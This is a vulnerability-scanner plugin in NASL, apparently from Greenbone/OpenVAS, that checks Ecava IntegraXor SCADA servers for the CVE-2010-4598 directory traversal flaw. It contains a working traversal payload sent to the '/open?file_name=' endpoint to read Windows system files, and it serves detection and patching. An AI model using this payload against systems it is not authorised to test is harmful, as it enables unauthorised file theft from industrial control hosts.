CPE = "cpe:/a:ecava:integraxor";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801496" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)" );
	script_cve_id( "CVE-2010-4598" );
	script_bugtraq_id( 45535 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Ecava IntegraXor Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_ecava_integraxor_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 7131 );
	script_mandatory_keys( "EcavaIntegraXor/Installed" );
	script_tag( name: "insight", value: "The flaw is due to 'open' request, which can be used by an
  attacker to download files from the disk where the server is installed." );
	script_tag( name: "solution", value: "Upgrade to Ecava IntegraXor 3.6.4000.1 or later." );
	script_tag( name: "summary", value: "This host is running Ecava IntegraXor and is prone Directory
  Traversal vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to download
  files from the disk where the server is installed through directory traversal attacks." );
	script_tag( name: "affected", value: "Ecava IntegraXor version 3.6.4000.0 and prior" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15802/" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.ecava.com/index.htm" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "windows" );
for file in keys( files ) {
	url = dir + "/open?file_name=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\" + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( url: url, port: port );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

